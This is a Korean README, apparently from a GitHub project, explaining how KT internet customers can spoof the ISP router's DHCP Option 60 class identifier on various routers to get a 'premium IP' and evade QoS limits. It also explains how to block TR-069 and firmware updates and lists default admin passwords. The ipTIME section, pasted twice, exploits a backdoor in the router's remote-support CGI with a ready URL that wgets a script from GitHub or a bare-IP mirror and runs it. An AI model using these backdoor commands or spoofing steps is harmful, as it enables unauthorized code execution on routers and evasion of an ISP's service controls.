
# bypassQoSKoreatelecomISP
<img width="1200" height="673" alt="Image" src="https://cdn.krfoss.org/web/ROKFOSS.png" />

## ROKFOSS 프로젝트에서 일부 수정하였습니다

**이 글은 ROKFOSS 프로젝트에서 일부 수정한 것입니다. [원본](https://github.com/veilRedeemer/bypassQoSKoreatelecomISP)에는 없는 부분이 있을 수 있습니다.**

### 적용 가능 대상

- ✅ KT
- ✅ KT망을 이용하는 일부 인터넷

### 적용 불가 대상

- ❌ KT 이외의 모든 인터넷(SKB, LG 등 모두다)

**LG의 경우 현재까지 방법이 없으며, 필요한 경우 제한이 없는 SKB 또는 KT를 이용하는 것이 방법이 될 수도 있습니다**

### 문의

ROKFOSS 프로젝트에서 추가한 내용에 관해 문의가 있다면 ROKFOSS 프로젝트 공식 대표메일 krfoss@krfoss.org 또는 [ROKFOSS 공식 디스코드](https://chat.krfoss.org)으로 방문하여 주시길 바랍니다.

**빠른 답을 원한다면, 커뮤니티에 가입하여 다른 사용자들에게 조언을 구하면 좀 더 빠른 답을 얻으실 수도 있습니다.**

### 설정 검증

_설정이 제대로 되었는지 확인하고 싶다면 ROKFOSS 프로젝트 분산미러 웹 사이트를 [방문](https://http.krfoss.org)하여 자신의 위치 정보를 확인하세요. 위치가 한강에 빠져있다고 나온다면 설정이 올바르게 된것입니다._

### ❗알아두기

이 방법을 시도하기 전 상위 라우터(공유기)가 있지 않은지, 해당 라우터로부터 공인대역이 아닌 사설대역을 받고 있진 않은지 확인하십시오. 만일 사설대역을 받고 있는 경우 환경에 따라 적용되지 않을 수도 있습니다.

> [!TIP]
> 이 글은 네트워크 장비에 관한 지식이 필요합니다. 관련한 지식이 부족하거나 없는 경우에는 구글 검색이 유용할 수도 있습니다. 또는 인공지능의 도움을 받는 것도 방법이 될 수 있지만 인공지능의 환각으로 인한 잘못된 정보를 받을 수 있습니다.
> > KT뿐만 아니라 KT 계열사(KT망을 이용하는) 일부 서비스 제공업체에서도 이러한 설정을 적용하여 사용할 수 있습니다.
> > 
> > 확인됨 : KT 스카이라이프

> [!TIP]
> 프리미엄 대역을 잘 받았는지 확인하려면 ROKFOSS 프로젝트의 분산미러 페이지에 [방문](https://http.krfoss.org)하여 자신의 위치 정보를 확인하세요. **🔴빨간점**이 한강에 빠져있다고 나온다면 제대로 설정된 것입니다.

## TPLINK ROUTER

2025년 5월에 나온 펌웨어를 적용하면 TP-Link 라우터에서 Option 60을 사용할 수 있습니다. ER605 모델을 기준으로 설정 방법은 다음과 같습니다:

1.  **라우터 관리자 페이지에 접속**한 후 로그인합니다.    
2.  좌측 메뉴에서 **Network** 탭을 선택하고 **WAN**으로 들어갑니다.
3.  **WAN1**을 선택한 후, **Advanced Settings**를 클릭합니다.
4.  탭이 열리면 **Option 60** 항목에 아래 값을 입력합니다:
    ```
    KT_PR_HH_A_A
    ```
5.  입력 후, **Save**를 클릭하여 설정을 저장합니다.

**참고:** 다른 TP-Link 라우터나 공유기에서 Option 60을 성공적으로 설정한 사례가 있다면, [krfoss@krfoss.org](mailto:krfoss@krfoss.org)로 이메일을 보내어 알려주시거나 PR을 넣어주세요!

이 방법은 **TPLINK의 유무선 공유기에선 적용이 안될 수도 있습니다**

## OPNsense

OPNsense에서 WAN 인터페이스에 Option 60을 추가하려면 다음과 같은 절차를 따르세요:

1.  **Interfaces 탭**에서 **WAN 인터페이스**를 선택합니다.
2.  **DHCP Client Configuration** 섹션에서 **Configuration Mode**를 **Advanced**로 변경합니다.
3.  **Lease Requirements** 항목 아래의 **Send Options** 입력란에 `dhcp-class-identifier "KT_PR_HH_A_A"` 를 입력합니다.
4.  변경 사항을 완료한 후, **Save** 버튼을 클릭하여 저장합니다.

이렇게 하면 WAN 인터페이스에 Option 60을 성공적으로 추가할 수 있습니다.

<img width="900" height="1060" alt="image" src="https://github.com/user-attachments/assets/3b6051b2-1058-4d6e-a7f6-25ec6a0d558b" />

## MikroTik(미크로틱 라우터)

예시 사용기기: MikroTik Hap AX3(C53UiG+5HPaxD2HPaxD)

<img width="575" height="726" alt="Image" src="https://github.com/user-attachments/assets/2704f43a-06bf-420f-ab66-77005a3cd93c" />

1. WinBox 접속후 우측 메뉴에서 IP -> DHCP Client로 이동.

<img width="766" height="467" alt="Image" src="https://github.com/user-attachments/assets/bb6cdd37-e5ba-4680-8e7b-c2928cadda2c" />

2. 상단 메뉴인 DHCP Client Options 로 진입 이후 이미지와 같이 설정. (단 value 값은 **반드시 작은따옴표**로 감싸야 함)

| 항목 | 값 |
| ------------- | ------------- |
| Name  | 사용자 마음대로  |
| Code | 60  |
| Value | 'KT_PR_HH_A_TNIE_TI04-708H' (예시)  |

<img width="1144" height="673" alt="Image" src="https://github.com/user-attachments/assets/9bcc4575-72e2-4066-878b-720a306240ed" />

3. 2번에서 지정한 메뉴 옆의 DHCP Client를 눌러준 뒤 사용중인 인터페이스 클릭.

이후 상단의 Advanced 메뉴로 진입 후 DHCP Options에 2번에서 설정한 타입 지정 후 저장. (이미지 참고)

이후에 라우터를 재부팅 하면 IP가 KT 프리미엄 IP로 변경 됩니다.


## Synology NAS

이 내용은 DSM `7.3.1-86003 Update 1`을 기준으로 합니다.

1. **SSH 활성화**  
   제어판 > 터미널 및 SNMP > SSH 서비스 활성화

2. **`dhclient.conf` 수정**  
   `/etc/dhclient/ipv4/dhclient.conf` 경로에 있는 파일을 아래와 같이 수정합니다.

   수정 전:
   ```conf
   initial-interval 2;
   send host-name = gethostname();
   ```

   수정 후:
   ```conf
   initial-interval 2;
   send host-name = gethostname();
   send vendor-class-identifier "KT_PR_HH_A_A";
   ```

3. **네트워크 인터페이스 재시작**

   네트워크 인터페이스를 재시작해야 DHCP가 정상 반영됩니다.

   이때 네트워크 연결이 끊어질 수 있으므로 `&&`를 붙여 두 명령어가 한 번에 실행되게 하거나, 다른 LAN을 통해 작업하시는 게 좋습니다.

   ```shell
   sudo ip link set {인터페이스이름} down
   sudo ip link set {인터페이스이름} up
   ```

4. **반영되었는지 확인하기**

   아래 명령어를 입력하면 DHCP 패킷을 직접 확인할 수 있습니다.

   ```shell
   sudo tcpdump -i {인터페이스이름} -v port 67 or port 68
   ```

   맨 아래 `Vendor-Class (60)`에 `KT_PR_HH_A_A`가 제대로 출력되는지 확인합니다.

   ```shell
   tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
   21:41:24.849963 IP (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)
       0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from {MAC주소} (oui Unknown), length 300, xid 0x1a17e05d, Flags [none]
         Client-Ethernet-Address {MAC주소} (oui Unknown)
         Vendor-rfc1048 Extensions
           Magic Cookie 0x63825363
           DHCP-Message (53), length 1: Request
           Requested-IP (50), length 4: {IP주소}
           Hostname (12), length 5: "{Hostname}"
           Parameter-Request (55), length 7:
             Subnet-Mask (1), BR (28), Time-Zone (2), Default-Gateway (3)
             Domain-Name (15), Domain-Name-Server (6), Hostname (12)
           Vendor-Class (60), length 12: "KT_PR_HH_A_A"
           Client-ID (61), length 7: ether {MAC주소}
   ```


# ⚠️ 아래부터는 ROKFOSS 프로젝트에서 관리하지 않는 부분입니다.

> [!WARNING]
> 가정용 공유기는 [원본](https://github.com/veilRedeemer/bypassQoSKoreatelecomISP) 문서에서 확인하실 수 있습니다.


## KT GiGA WiFi (통신사 Router, 기본값 설정인 KT 모드가 필요)
제한에서 벗어날 <ins>**각 기기**</ins>(이중 NAT 구성의 미지원 Router 포함)에 대해 수동IP설정 **또는** GiGA WiFi의 사용자 설정 웹 페이지에서 '수동 IP 할당 설정'(DHCP 정적 할당) 설정을 마치세요

아래 표를 확인하여 현재 사용중인 모델의 KT GiGA WiFi에서 사용 가능여부(추측 포함)를 확인하기\:

|＼|수동IP설정|수동 IP 할당 설정|업그레이드,TR069 차단|
|---------:|:--|:--|:--|
|KM06-506H, KM06-704H|？|✕|？|
|DW02-412H|？|✕|✕|
|KM08-708H, DV01-901H<br>Wave2|？|？|？|
|TI04-708H Wave2|〇|✕|✕|
|KM12-007H<br>GiGA WiFi home ax|？|？|？|
|KM17-305H<br>GiGA WiFi home ax|〇|〇|？|
|KM15-103H<br>GiGA WiFi home ax|〇|〇|〇|
|DV02-012H<br>GiGA WiFi home ax|〇|〇|✕|
|HR08-407H<br>GiGA WiFi home ax|〇|✕|〇|
|AR06-012H<br>GiGA WiFi home ax|〇|✕|✕|
|KM18-311H<br>KT WiFi 6D|？|？|？|
|KB01-411H<br>KT WiFi 7D|？|？|？|

__표에서 확인할 수 없는 모델의 각 기능 사용 가능여부를 여러분의 제보(Issues, 메일주소 3570kgen@naver.com , 기여자에 대한 기록을 남기고 싶을경우 Pull Request 등)를 통해 보충할 수 있게 해주세요!__

__사용중인 기기의 모델명, 펌웨어 버전, 수동IP설정, '수동 IP 할당 설정'의 성공 여부,__
__KT GiGA WiFi 사용자 설정 페이지 - 상태정보의 로그('Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그 확인, 부팅 후 많은 시간이 지나면 다른 로그에 의해 확인할 수 없는 경우가 있음)를 확인한 후, 'Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그가 아래의 4가지 규칙 추가 & 재부팅 후 2-5분 후에 기록되는 로그와 비교해 차이점이 있는지 확인하고 알려주셨으면 합니다.__

--------------------------------

ASUSWRT(아수스 공유기, 이중 NAT 구성에서 사용할 수 없음) - http://www.asusrouter.com 에서 초기 설정 시 입력한 관리자 계정과 암호를 입력 후
 1. 아래 링크의 자동 IP - c단락을 참고하거나,
 2. 아래 스크린샷을 참고하여

클래스 식별자 (Option 60)를 KT_PR_HH_A_A 로 입력 후 적용:
https://www.asus.com/kr/support/faq/1011715/
![asuswrt2a](https://github.com/user-attachments/assets/c8936908-946f-40d5-9a8e-b480b0ce658b)

--------------------------------
수동IP설정

**각 기기**는 수동IP설정 적용 후, 다른 WiFi 연결 또는 다른 공유기와 연결 시 네트워크/인터넷에 연결할 수 없는 경우가 있으며 이 때 해당 설정을 원래대로(자동/DHCP) 되돌리세요. **각 기기**마다 설정 방법이 다를 수 있습니다

Windows 11과 같이 서브넷 접두사 길이가 아닌 서브넷 마스크를 요구하는 경우 255.255.255.0을 입력하세요.

![W10manualIP_0](https://github.com/user-attachments/assets/77e57272-64f5-4cae-bf86-23bc7e9bcff2)

Windows 11에서는 UI에 차이가 있습니다\:

![w11SettingApp](https://github.com/user-attachments/assets/53cc5dc3-22ab-41e2-93dd-a4bc4c3d7fbd)

![W10manualIP_1](https://github.com/user-attachments/assets/fa07bd17-579b-467c-97c7-40bcc43d4ec2)

또는 '수동 IP 할당 설정'을 사용하기(분기 시작)

KT GiGA WiFi와 연결된 기기에서 http://172.30.1.254:8899 , 구성되지 않은 경우 ID는 ktuser , 비번은 megaap 또는 homehub 로 로그인 후 새로운 사용자 이름과 비번을 설정하여 사용자 설정 페이지에 접근할 수 있습니다\:

장치설정 - 네트워크 관리 - LAN 연결 설정

![StaticLeasePremiumIP_KTGiGAWiFi](https://github.com/user-attachments/assets/9d7bda7f-f1a5-4663-8435-f91347cf6cbf)

GiGA WiFi의 사용자 설정 페이지에서 수동IP설정 없이 '수동 IP 할당 설정'**(일부 기기만 지원)** 을 필요에 따라 완료하세요. 
__변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되므로 KT GiGA WiFi를 재시동하거나 각 기기의 네트워크 연결을 끊었다가 다시 연결해야 할 수 있습니다.__

(분기 끝)

--------------------------------

변경 사항이 적용된 후, https://icanhazip.com 와 같은 외부 서비스를 사용하여 외부 IP주소를 확인하면 기존과 다른 '프리미엄 IP'가 할당된 것을 확인할 수 있으며, 프리미엄 IP에서도 포트 포워딩을 사용할 수 있습니다.
<img width="1080" alt="GiGAWifi_premiumip" src="https://github.com/user-attachments/assets/280c972c-cc1d-4ca3-bf41-ac8a4e77b74c" />

--------------------------------

마무리로서, 해당 방법의 사용을 저지하려는 시도 중 일부를 방지하기 위해 GiGA WiFi의 자동 펌웨어 업그레이드와 TR-069 통신을 차단 **(일부 기기만 지원)** 합시다

먼저 허용 규칙부터 추가해야 GiGA WiFi에 연결된 IPTV 등의 기기에서의 오작동을 방지할 수 있습니다

4개의 규칙을 모두 추가한 후, 허용 규칙이 차단 규칙보다 밑에(머큐리) 또는 위에(H1Radio) 있으면 됩니다.

<img width="497" alt="FWUpgradeBlocking_2" src="https://github.com/user-attachments/assets/05a0f3bb-f7c1-4724-9ba3-203dc0093c36" />


--------------------------------

넷기어 (예시로서 나이트호크 RAX80) -

<img width="1424" alt="Nighthawk_RAX80" src="https://github.com/user-attachments/assets/c5c1ba09-4d63-4d28-8e2b-3f1344e36719" />

--------------------------------

시놀로지RT (예시로서 RT1900ac) - 

![RT1900ac](https://github.com/user-attachments/assets/5ea5243e-821a-42c5-a18d-e3f2dcd5319e)

--------------------------------

OpenWrt - 

https://archive.md/VRZIO

--------------------------------

iptime(알파테스트중)

백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨

위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다

<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>

1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다:
<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />

2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

  이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
   
<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />

   미러 링크는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 미러 링크를 사용:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

3. 아래와 같이 표시되면 성공. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />

성공적으로 프리미엄 IP를 취득했거나 실패했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부, 실패 시 출력되는 메세지를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.

--------------------------------

--------------------------------

iptime(알파테스트중)

백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨

위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다

<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>

1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다:
<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />

2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

  이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
   
<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />

   미러 링크는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 미러 링크를 사용:

http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh

3. 아래와 같이 표시되면 성공. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />

성공적으로 프리미엄 IP를 취득했거나 실패했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부, 실패 시 출력되는 메세지를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.

--------------------------------
